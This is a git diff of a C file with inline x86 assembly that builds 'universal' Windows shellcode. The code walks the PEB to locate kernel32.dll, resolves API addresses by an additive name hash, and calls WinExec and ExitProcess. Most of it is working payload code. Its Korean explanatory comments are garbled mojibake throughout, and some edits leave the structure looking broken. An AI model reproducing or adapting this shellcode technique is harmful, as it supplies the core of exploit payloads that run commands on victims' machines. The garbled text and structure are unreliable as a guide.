@@ -1,62 +1,38 @@
-
-/*
-bool define
-*/
-#include <stdio.h>
-#include <windows.h>
-
-
-#define TRUE 1
-#define FALSE 0
-
+ï»¿
 /*
 SW_SHOW value is for using WinExec API
-
 UINT WinExec(
   LPCSTR lpCmdLine,
   UINT   uCmdShow
 );
-
 UINT: unsigned int
 LPCSTR: long pointer constant string (const char *)
 ...
-
 unsigned int WinExec(
 	const char *lpCmdLine,
 	unsigned int uCmdShow
 );
-
 */
 #define SW_SHOW 5
 
 /*
-
 purpose:		universal-shellcode
-programmer:	woohyuk seo (¼­¿ìÇõ)
+programmer:	woohyuk seo (ì„œìš°í˜)
 doc write date: 	12/19/2019
 compiler: 	Visual Studio 2019 C++
-
-universal shellcode´Â kernel32.dllÀÌ exportÇÏ´Â ÁÖ¼Ò°¡ ¸Å¹ø ¹Ù²î¾î¼­ callÇÏ´Â ÁÖ¼Ò°¡ À¯È¿ÇÏÁö ¾Ê°ÔµÈ´Ù
-Á¤ÀûÀ¸·Î ¸¸µé¾îÁø ÀÏ¹İÀûÀÎ ½©ÄÚµåÀÇ ÇÑ°è¸¦ ±Øº¹ÇÏ±â À§ÇØ¼­ ¸¸µé¾îÁ³´Ù.
-
-kenrel32.dllÀÌ process¿¡ mappingµÇ¾úÀ»¶§, ÇØ´ç kernel32.dllÀ» ¾ò¾î³½´ÙÀ½
-ÇÔ¼öÀÇ ÁÖ¼Ò¸¦ °è»êÇÑ´Ù.
-
-kernel32.dllÀÌ mappingµÈ °÷Àº PEB¶ó°íÇÑ´Ù.
-
-µû¶ó¼­..
-
-universal shellcode¸¦ ¸¸µé±â À§ÇØ¼­ PEB(process environment block)ÀÇ À§Ä¡¸¦ ±¸ÇØ¾ßÇÑ´Ù.
-PEBÀÇ À§Ä¡¸¦ ±¸ÇÏ´Â °úÁ¤¿¡¼­ fs register¸¦ ÀÌ¿ëÇÑ´Ù.
-
-user modeÀÇ fs register´Â ÇöÀç ÇÁ·Î¼¼¼­ÀÇ TEB(thread environment block) ¸¦ °¡¸£Å°°íÀÖ´Ù.
-kernel modeÀÇ fs register´Â KPCR (processor control region) ¸¦ °¡¸£Å°°íÀÖ´Ù. (¾Õ¿¡ ºÙ´Â KÀÇ ¶æÀº kernelÀÇ ¾àÀÚ°°´Ù.)
-KPCRÀº schedule infoµéÀÌ ÀúÀåµÈ´Ù. (½ÇÇàµÉ ½º·¹µåµéÀÇ Á¤º¸µé, Å¥ Á¤º¸, ... ¶ó°í ÇÑ´Ù.
-
-
-fs:0x30À§Ä¡¿¡ PEB°¡ Á¸ÀçÇÑ´Ù.
-±¸Á¶´Â ´ÙÀ½°ú °°´Ù.
-
+universal shellcodeëŠ” kernel32.dllì´ exportí•˜ëŠ” ì£¼ì†Œê°€ ë§¤ë²ˆ ë°”ë€Œì–´ì„œ callí•˜ëŠ” ì£¼ì†Œê°€ ìœ íš¨í•˜ì§€ ì•Šê²Œëœë‹¤
+ì •ì ìœ¼ë¡œ ë§Œë“¤ì–´ì§„ ì¼ë°˜ì ì¸ ì‰˜ì½”ë“œì˜ í•œê³„ë¥¼ ê·¹ë³µí•˜ê¸° ìœ„í•´ì„œ ë§Œë“¤ì–´ì¡Œë‹¤.
+kenrel32.dllì´ processì— mappingë˜ì—ˆì„ë•Œ, í•´ë‹¹ kernel32.dllì„ ì–»ì–´ë‚¸ë‹¤ìŒ
+í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ê³„ì‚°í•œë‹¤.
+kernel32.dllì´ mappingëœ ê³³ì€ PEBë¼ê³ í•œë‹¤.
+ë”°ë¼ì„œ..
+universal shellcodeë¥¼ ë§Œë“¤ê¸° ìœ„í•´ì„œ PEB(process environment block)ì˜ ìœ„ì¹˜ë¥¼ êµ¬í•´ì•¼í•œë‹¤.
+PEBì˜ ìœ„ì¹˜ë¥¼ êµ¬í•˜ëŠ” ê³¼ì •ì—ì„œ fs registerë¥¼ ì´ìš©í•œë‹¤.
+user modeì˜ fs registerëŠ” í˜„ì¬ í”„ë¡œì„¸ì„œì˜ TEB(thread environment block) ë¥¼ ê°€ë¥´í‚¤ê³ ìˆë‹¤.
+kernel modeì˜ fs registerëŠ” KPCR (processor control region) ë¥¼ ê°€ë¥´í‚¤ê³ ìˆë‹¤. (ì•ì— ë¶™ëŠ” Kì˜ ëœ»ì€ kernelì˜ ì•½ìê°™ë‹¤.)
+KPCRì€ schedule infoë“¤ì´ ì €ì¥ëœë‹¤. (ì‹¤í–‰ë  ìŠ¤ë ˆë“œë“¤ì˜ ì •ë³´ë“¤, í ì •ë³´, ... ë¼ê³  í•œë‹¤.
+fs:0x30ìœ„ì¹˜ì— PEBê°€ ì¡´ì¬í•œë‹¤.
+êµ¬ì¡°ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.
 typedef struct _PEB {
   BYTE                          Reserved1[2];
   BYTE                          BeingDebugged;
@@ -71,35 +47,25 @@ typedef struct _PEB {
   PVOID                         Reserved7[1];
   ULONG                         SessionId;
 } PEB, *PPEB;
-
 typedef struct _PEB_LDR_DATA {
   BYTE       Reserved1[8];	//sizeof(unsigned char) = 1,  sizeof(unsigned char) * 8 = 8
   PVOID      Reserved2[3];	//sizeof(void *) = 4, sizeof(void *) * 2 = 8
-
   //distance = (8 + 8 + 4) = 20 byte ( InMemoryOrderModuleList.Flink )
-
   LIST_ENTRY InMemoryOrderModuleList;
 } PEB_LDR_DATA, *PPEB_LDR_DATA;
-
-PEB¿¡¼­ (2 + 1 + 1 + 4 + 4 = 12) ¸¸Å­ ´õÇÏ¸é PPEB_LDR_DATA Ldr (Æ÷ÀÎÅÍ º¯¼ö)ÀÇ ÁÖ¼Ò°¡ ³ª¿È
-Loade_export°¡ °¡¸£Å°´Â ÁÖ¼Ò¿¡¼­, (8 + (4 * 3) = 20)  ¸¸Å­ ´õÇÏ¸é LIST_ENTRY InMemoryOrderModuleList ÀÇ ÁÖ¼Ò°¡ ³ª¿È
-InMemoryOrderModuleList Àº ÀÌÁß¸µÅ©¸¦ °¡Áö°í ÀÖ´Ù.
-
-Á¤º¸´Â ´ÙÀ½°ú °°´Ù
+PEBì—ì„œ (2 + 1 + 1 + 4 + 4 = 12) ë§Œí¼ ë”í•˜ë©´ PPEB_LDR_DATA Ldr (í¬ì¸í„° ë³€ìˆ˜)ì˜ ì£¼ì†Œê°€ ë‚˜ì˜´
+Loade_exportê°€ ê°€ë¥´í‚¤ëŠ” ì£¼ì†Œì—ì„œ, (8 + (4 * 3) = 20)  ë§Œí¼ ë”í•˜ë©´ LIST_ENTRY InMemoryOrderModuleList ì˜ ì£¼ì†Œê°€ ë‚˜ì˜´
+InMemoryOrderModuleList ì€ ì´ì¤‘ë§í¬ë¥¼ ê°€ì§€ê³  ìˆë‹¤.
+ì •ë³´ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤
 .
 typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
 } LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;
-
-FLink´Â Front Link, BLink´Â Back Link¶ó´Â ¶æÀÓ (¸Ç ¸¶Áö¸· ¸µÅ©´Â NULLÀ» °¡¸£Å°°íÀÖÀ½)
-
-
-°¢°¢ ¸µÅ©´Â LDR_DATA_TABLE_ENTRY¸¦ °¡¸£Å°°íÀÖ´Ù.
-LDR_DATA_TABLE_ENTRY´Â ÇØ´ç ÇÁ·Î¼¼½º°¡ ·ÎµåÇÑ DLLÀÇ Á¤º¸¸¦ °¡Áö°íÀÖ´Ù.
-
-Á¤º¸´Â ´ÙÀ½°ú °°´Ù.
-
+FLinkëŠ” Front Link, BLinkëŠ” Back Linkë¼ëŠ” ëœ»ì„ (ë§¨ ë§ˆì§€ë§‰ ë§í¬ëŠ” NULLì„ ê°€ë¥´í‚¤ê³ ìˆìŒ)
+ê°ê° ë§í¬ëŠ” LDR_DATA_TABLE_ENTRYë¥¼ ê°€ë¥´í‚¤ê³ ìˆë‹¤.
+LDR_DATA_TABLE_ENTRYëŠ” í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ê°€ ë¡œë“œí•œ DLLì˜ ì •ë³´ë¥¼ ê°€ì§€ê³ ìˆë‹¤.
+ì •ë³´ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.
 typedef struct _LDR_DATA_TABLE_ENTRY {
 	PVOID Reserved1[2];
 	LIST_ENTRY InMemoryOrderLinks;
@@ -116,29 +82,22 @@ typedef struct _LDR_DATA_TABLE_ENTRY {
 	};
 	ULONG TimeDateStamp;
 } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
-
-¿©±â¼­ ÁÖÀÇÇØ¾ß ÇÒ Á¡Àº, Reserved1¸â¹öºÎÅÍ °è»êÇÏÁö ¾Ê°í, InMemoryOrderLinksºÎÅÍ °è»êÇÏ¿©,  ((4 * 2) + (4 * 2)) = 16byte¸¸Å­ ´õÇÏ¿© DllBase¿¡ Á¢±ÙÇØ¾ß ÇÑ´Ù´Â Á¡ÀÌ´Ù.
-ÀÌÀ¯´Â InMemoryOrderLinks´Â ÀÌÁß¸®½ºÆ®ÀÌ´Ù, ´ç¿¬È÷ °è»êÇßÀ»¶§, Front LinkºÎÅÍ ÂüÁ¶µÉ°ÍÀÌ´Ù.
-Front LinkºÎÅÍ ÂüÁ¶µÊÀ¸·Î 32ºñÆ®È¯°æ¿¡¼­ÀÇ ¸Ş¸ğ¸®ÁÖ¼ÒÅ©±â (4byte) 4°³ µÚ¿¡ DllBase°¡ Á¸ÀçÇÑ´Ù.
-
-DllBase´Â mappingµÈ DLLÀÇ ÁÖ¼Ò¸¦ °¡Áö°íÀÖ´Ù.
-
-DllBase°¡ °¡¸£Å°´Â ÁÖ¼Ò¸¦ register¿¡ ÂüÁ¶½ÃÅ°´Â ¹æ¹ıÀº ¿ªÂüÁ¶¸¦ »ç¿ëÇØ¾ßÇÑ´Ù.
-mov´Â ·¹Áö½ºÅÍ, º¯¼ö¸¦ 4¹ÙÀÌÆ®¸¸Å­ º¹»çÇÑ´Ù. (movzx, movsx, movs)°°Àº ¸í·ÉÀº 4¹ÙÀÌÆ®º¸´Ù Àû°Å³ª, Å« ¹ÙÀÌÆ®¸¦ º¹»çÇÑ´Ù.
-intel¹®¹ı¿¡¼­, 4¹ÙÀÌÆ® ¿ªÂüÁ¶ÀÇ Ç¥ÇöÀº ´ÙÀ½°ú °°´Ù. mov register, [register]
-DllBase´Â LPVOIDÇü½ÄÀÓÀ¸·Î mov¸¦ »ç¿ëÇÑ´Ù.
-
-CÀÇ ÇÔ¼ö¿¡¼­, ebp ·¹Áö½ºÅÍ·Î ºÎÅÍ µ¡¼ÀÀ» ÁøÇàÇÏ¸é ÇÔ¼öÀÎÀÚ°ªÀÌ, »¬¼ÀÀ» ÁøÇàÇÏ¸é local variable area °¡ ³ª¿Â´Ù.
-
-GetApiAddress ÇÔ¼ö´Â È£È¯¼º°ú ÀÌ½Ä¼ºÀ» À§ÇØ¼­ ³²°ÜµĞ´Ù.
+ì—¬ê¸°ì„œ ì£¼ì˜í•´ì•¼ í•  ì ì€, Reserved1ë©¤ë²„ë¶€í„° ê³„ì‚°í•˜ì§€ ì•Šê³ , InMemoryOrderLinksë¶€í„° ê³„ì‚°í•˜ì—¬,  ((4 * 2) + (4 * 2)) = 16byteë§Œí¼ ë”í•˜ì—¬ DllBaseì— ì ‘ê·¼í•´ì•¼ í•œë‹¤ëŠ” ì ì´ë‹¤.
+ì´ìœ ëŠ” InMemoryOrderLinksëŠ” ì´ì¤‘ë¦¬ìŠ¤íŠ¸ì´ë‹¤, ë‹¹ì—°íˆ ê³„ì‚°í–ˆì„ë•Œ, Front Linkë¶€í„° ì°¸ì¡°ë ê²ƒì´ë‹¤.
+Front Linkë¶€í„° ì°¸ì¡°ë¨ìœ¼ë¡œ 32ë¹„íŠ¸í™˜ê²½ì—ì„œì˜ ë©”ëª¨ë¦¬ì£¼ì†Œí¬ê¸° (4byte) 4ê°œ ë’¤ì— DllBaseê°€ ì¡´ì¬í•œë‹¤.
+DllBaseëŠ” mappingëœ DLLì˜ ì£¼ì†Œë¥¼ ê°€ì§€ê³ ìˆë‹¤.
+DllBaseê°€ ê°€ë¥´í‚¤ëŠ” ì£¼ì†Œë¥¼ registerì— ì°¸ì¡°ì‹œí‚¤ëŠ” ë°©ë²•ì€ ì—­ì°¸ì¡°ë¥¼ ì‚¬ìš©í•´ì•¼í•œë‹¤.
+movëŠ” ë ˆì§€ìŠ¤í„°, ë³€ìˆ˜ë¥¼ 4ë°”ì´íŠ¸ë§Œí¼ ë³µì‚¬í•œë‹¤. (movzx, movsx, movs)ê°™ì€ ëª…ë ¹ì€ 4ë°”ì´íŠ¸ë³´ë‹¤ ì ê±°ë‚˜, í° ë°”ì´íŠ¸ë¥¼ ë³µì‚¬í•œë‹¤.
+intelë¬¸ë²•ì—ì„œ, 4ë°”ì´íŠ¸ ì—­ì°¸ì¡°ì˜ í‘œí˜„ì€ ë‹¤ìŒê³¼ ê°™ë‹¤. mov register, [register]
+DllBaseëŠ” LPVOIDí˜•ì‹ì„ìœ¼ë¡œ movë¥¼ ì‚¬ìš©í•œë‹¤.
+Cì˜ í•¨ìˆ˜ì—ì„œ, ebp ë ˆì§€ìŠ¤í„°ë¡œ ë¶€í„° ë§ì…ˆì„ ì§„í–‰í•˜ë©´ í•¨ìˆ˜ì¸ìê°’ì´, ëº„ì…ˆì„ ì§„í–‰í•˜ë©´ local variable area ê°€ ë‚˜ì˜¨ë‹¤.
+GetApiAddress í•¨ìˆ˜ëŠ” í˜¸í™˜ì„±ê³¼ ì´ì‹ì„±ì„ ìœ„í•´ì„œ ë‚¨ê²¨ë‘”ë‹¤.
 int GetApiAddress(int ModuleAddress, const char* Name)
 {
 	int r = 0;
-
 	__asm
 	{
 		mov edi, [ebp + 8]; //ModuleAddress
-
 		//Image dos header
 		//0x3C offset pointing value is 0xE8
 		//0xE8 value means 'Offset to new EXE header' *(PE..)
@@ -147,123 +106,71 @@ int GetApiAddress(int ModuleAddress, const char* Name)
 		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
 		add edi, ebx;			//add DllBase
 		mov edx, edi;			//._export IMAGE_EXPORT_DIRECTORY
-
 		mov [ebp - 12], edx;
-
 	//get string hash
-
 		xor eax, eax;
 		xor ecx, ecx;
-
 		xor esi, esi;
-
 		mov ebx, [ebp + 12];
-
 	_NAME_HASH:;
 		movsx edx, byte ptr[ebx + ecx];
 		add ecx, 1;
 		add eax, edx;
-
 		cmp edx, esi;
 		jne _NAME_HASH;
-
 		mov [ebp - 16], eax;
-
-
 	//find api name
-
 		mov eax, [ebp - 12];
 		add eax, 32;
 		mov eax, [eax];
 		add eax, [ebp + 8];
-
 		xor esi, esi;
-
 	_LOOP:;
 		mov ebx, [eax + esi * 4];
 		add ebx, [ebp + 8];
-
 		xor ecx, ecx;
 		xor edi, edi;
-
 	__LOOP:;
 		movsx edx, byte ptr[ebx + ecx];
-
 		add edi, edx;
 		add ecx, 1;
-
 		cmp edx, 0;
 		jne __LOOP;
-
 		cmp edi, [ebp - 16];
 		je BREAK_LABLE;
-
 		add esi, 1;
-
 		jmp _LOOP;
-
 	BREAK_LABLE:;
-
 		//get ordinal number of the function
-
 		mov ebx, [ebp - 12];
 		add ebx, 36;
 		mov ebx, [ebx];
-
 		mov eax, 2;
 		mov ecx, esi;
 		mul ecx;
-
 		add ebx, eax;
 		add ebx, [ebp + 8];
-
 		movsx edx, word ptr[ebx];
-
 		//ordinal is started from one
 		add edx, 1;
-
 		//get function address
 		mov ebx, [ebp - 12];
 		add ebx, 28;
 		mov ebx, [ebx];
-
 		add ebx, [ebp + 8];
-
 		mov eax, 4;
 		mul edx;
 		sub eax, 4;
-
 		add ebx, eax;
-
 		mov ebx, [ebx];
 		add ebx, [ebp + 8];
-
 		mov eax, ebx;
 		mov r, ebx;
 	}
-
 	return r;
 }
 */
 
-
-/*
-	example for calculating hash
-
-	const char kernel32_string[] = "KERNEL32.DLL";
-	int kernel32_string_hash = 0;
-
-	for (int i = 0; kernel32_string[i] != 0; i++)
-	{
-		kernel32_string_hash += kernel32_string[i];
-	}
-
-	//kernel32_string_hash is 816 (decimal);
-*/
-
-
-int _WinExec;
-int _ExitProcess;
 
 int main()
 {
@@ -272,20 +179,27 @@ int main()
 		push ebp;
 		sub esp, 64;
 
-		//eax ·¹Áö½ºÅÍ¿¡ PEBÀúÀå
+		//eax ë ˆì§€ìŠ¤í„°ì— PEBì €ì¥
 		mov eax, fs:0x30;
 
-		//PEB·ÎºÎÅÍ 12´ÙÀ½ ÁÖ¼Ò´Â LDR, ¿ªÂüÁ¶¸¦ ÅëÇØ¼­ ¸â¹ö¿¡ Á¢±Ù
+		//PEBë¡œë¶€í„° 12ë‹¤ìŒ ì£¼ì†ŒëŠ” LDR, ì—­ì°¸ì¡°ë¥¼ í†µí•´ì„œ ë©¤ë²„ì— ì ‘ê·¼
 		mov eax, [eax + 12];
-		//¸â¹ö¿¡¼­ 20¸¸Å­ ´õÇÏ¸é, LIST_ENTRY InMemoryOrderModuleListÀÌ´Ù. ¿ªÂüÁ¶¸¦ ÅëÇØ¼­ Flink¿¡ Á¢±ÙÇÑ´Ù.
+		//ë©¤ë²„ì—ì„œ 20ë§Œí¼ ë”í•˜ë©´, LIST_ENTRY InMemoryOrderModuleListì´ë‹¤. ì—­ì°¸ì¡°ë¥¼ í†µí•´ì„œ Flinkì— ì ‘ê·¼í•œë‹¤.
 		mov eax, [eax + 20];
 
-		//FLINK¸¦ ÅëÇØ¼­ entry¿¡ Á¢±ÙÇÑ´Ù. 
-		//doubly linked listÀÓÀ¸·Î ¿ªÂüÁ¶¸¦ ÅëÇØ¼­ ´ÙÀ½ entry¿¡ Á¢±ÙÇÒ¼öÀÖ´Ù.
-		mov eax, [eax];
-		mov eax, [eax];
+		//FLINKë¥¼ í†µí•´ì„œ entryì— ì ‘ê·¼í•œë‹¤. 
+		//doubly linked listì„ìœ¼ë¡œ ì—­ì°¸ì¡°ë¥¼ í†µí•´ì„œ ë‹¤ìŒ entryì— ì ‘ê·¼í• ìˆ˜ìˆë‹¤.
 
-		//½ÇÇàÆÄÀÏÀÇ ½ÇÁ¦ ÁÖ¼Ò (MZ)¸¦ ±¸ÇÑ´Ù. flink¸¦ ÀÌ¿ëÇØ ¾ò¾î³½ entry·Î ºÎÅÍ 16´ÙÀ½ ÁÖ¼Ò¿¡ ÀÖ´Ù.
+	GET_NEXT_LINK:;
+		mov eax, [eax];
+		movsx ebx, word ptr[eax + 36];
+
+		//24 is kernel32.dll unicode string length
+		cmp ebx, 24;
+		jne GET_NEXT_LINK;
+
+
+		//ì‹¤í–‰íŒŒì¼ì˜ ì‹¤ì œ ì£¼ì†Œ (MZ)ë¥¼ êµ¬í•œë‹¤. flinkë¥¼ ì´ìš©í•´ ì–»ì–´ë‚¸ entryë¡œ ë¶€í„° 16ë‹¤ìŒ ì£¼ì†Œì— ìˆë‹¤.
 		mov ebx, [eax + 16];
 
 		//module address
@@ -405,8 +319,8 @@ int main()
 
 		lea ecx, [ebp + 0xc];
 
-		xor eax, eax;
-		push eax;
+		mov eax, 1
+			push eax;
 		push ecx;
 		call edi;
 
@@ -418,7 +332,6 @@ int main()
 
 		add esp, 64;
 		pop ebp;
-	}
 
-	return 0;
+	}
 }
